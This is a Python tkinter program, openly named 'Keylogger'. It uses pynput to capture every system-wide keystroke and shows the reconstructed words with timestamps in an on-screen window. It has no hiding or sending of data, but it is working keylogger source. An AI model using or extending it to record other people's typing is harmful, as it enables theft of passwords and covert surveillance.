import tkinter as tk
from tkinter import scrolledtext, ttk
from pynput.keyboard import Listener
from datetime import datetime
import time

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("900x600")
        self.root.configure(bg="#0D1117")  # Dark background

        # Set DPI awareness (Windows only)
        try:
            from ctypes import windll
            windll.shcore.SetProcessDpiAwareness(1)
        except:
            pass
        # Modern title
        self.title_label = tk.Label(
            root, text="Keylogger", font=("Bahnschrift", 28, "bold"),
            fg="#C9D1D9", bg="#0D1117"
        )
        self.title_label.pack(pady=10)

        # Subtitle instruction
        self.subtitle_label = tk.Label(
            root, text="Track those keystrokes.",
            font=("Arial", 16), fg="#8B949E", bg="#0D1117"
        )
        self.subtitle_label.pack(pady=5)

        # Create a main frame to hold cards and log display
        self.main_frame = tk.Frame(root, bg="#0D1117")
        self.main_frame.pack(pady=20, padx=20, fill=tk.BOTH, expand=True)

        # Create a card-like frame for the log display
        self.log_card = tk.Frame(self.main_frame, bg="#161B22", bd=0, relief='ridge')
        self.log_card.pack(side=tk.LEFT, padx=10, pady=10, fill=tk.BOTH, expand=True)

        # Scrollable text area for the keylogger output
        self.log_display = scrolledtext.ScrolledText(
            self.log_card, wrap=tk.WORD, font=("Consolas", 14),
            bg="#0D1117", fg="#C9D1D9", insertbackground='#58A6FF',
            borderwidth=0, relief='flat'
        )
        self.log_display.pack(padx=15, pady=15, fill=tk.BOTH, expand=True)

        # Create a card for buttons with a soft shadow effect
        self.button_card = tk.Frame(self.main_frame, bg="#161B22", bd=0, relief='ridge')
        self.button_card.pack(side=tk.RIGHT, padx=10, pady=10, fill=tk.Y)

        # Clear Log Button with modern styling
        self.clear_button = tk.Button(
            self.button_card, text="Clear Log", command=self.clearLog,
            font=("Arial", 16), bg="#238636", fg="white",
            activebackground="#2EA043", activeforeground="white",
            borderwidth=0, relief='flat', padx=10, pady=5
        )
        self.clear_button.pack(pady=20, padx=10, fill=tk.X)

        # Start the keylogger listener
        self.startKeylogger()
        self.word_stack = []
        self.latesttime = time.time()

    def wordStacker(self, key):
        key = str(key).replace("'", "")
        word = ''.join(self.word_stack)

        if key == 'Key.backspace':
            try:
                self.word_stack.pop(-1)
            except IndexError:
                pass
        elif key == 'Key.space':
            self.enqueueIntoLog(word + " ")
            self.word_stack.clear()
        elif key == 'Key.enter':
            self.enqueueIntoLog(word + "\n[ENTER]\n")
            self.word_stack.clear()
        else:
            self.word_stack.append(key)

    def enqueueIntoLog(self, word):
        current = time.time()
        if current - self.latesttime > 30:
            timestamp = datetime.now().strftime("\n%Y-%m-%d %H:%M:%S")
            self.log_display.insert(tk.END, f"{timestamp}\n{word}")
        else:
            self.log_display.insert(tk.END, word)
        self.log_display.see(tk.END)
        self.latesttime = time.time()

    def clearLog(self):
        self.log_display.delete(1.0, tk.END)

    def startKeylogger(self):
        self.listener = Listener(on_press=self.wordStacker)
        self.listener.start()

    def onClose(self):
        self.listener.stop()
        self.root.destroy()

# GUI initialization
root = tk.Tk()
app = KeyloggerGUI(root)

root.protocol("WM_DELETE_WINDOW", app.onClose)
root.mainloop()